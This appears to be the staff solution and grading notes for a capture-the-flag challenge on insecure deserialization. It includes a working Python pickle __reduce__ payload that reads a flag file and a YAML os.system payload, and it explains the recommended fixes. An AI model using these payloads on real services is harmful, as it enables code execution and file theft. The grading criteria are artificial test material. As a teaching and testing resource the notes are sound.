# inj12 (SessionVault) — intended solution & staff notes

## Path
1. Build a pickle whose top-level object reduces to `open('/flag/flag')`:
   ```python
   class R:
       def __reduce__(self):
           return (open, ('/flag/flag',))
   blob = base64.b64encode(pickle.dumps(R()))
   ```
2. `POST /restore` with the blob. The unpickler calls `open('/flag/flag')`
   while reconstructing; the preview helper sees a file-like object and
   calls `.read()` — the flag is reflected.

## Why it works — the model
`pickle.loads` is not "parse data", it is "run the reconstruction plan the
data carries". `__reduce__` returns `(callable, args)` and the unpickler
executes `callable(*args)` with the service's privileges. The companion
channel to CWE-94: no metacharacter, no shell — the serialized form itself
is the instruction set.

## Companion channels (same shape, other languages)
- **YAML**: `yaml.load` (unsafe loader) resolves `!!python/object/apply:os.system
  ["cat /flag/flag"]` / `!!python/object/new:` tags. Fix: `yaml.safe_load`.
- **Java**: `ObjectInputStream.readObject` runs `readResolve`/`readObject` of
  every class; with a reachable gadget chain (Commons-Collections,
  Spring, ...) that is RCE. Fix: `ObjectInputFilter` (JEP 290) allowlist,
  or a wire format that has no code path (JSON/protobuf).
- Cross-cutting fix: never deserialize untrusted bytes; if a "restore"
  feature is required, carry a schema (JSON with validation) and treat the
  result as data.

## Grading discriminators
- Builds the `__reduce__` gadget rather than trying string tricks at the
  base64 boundary.
- Explains the difference between deserialization and parsing (reconstruction
  is execution).
- Names the fix layer (don't deserialize untrusted data; allowlist classes /
  safe loaders), not a filter.
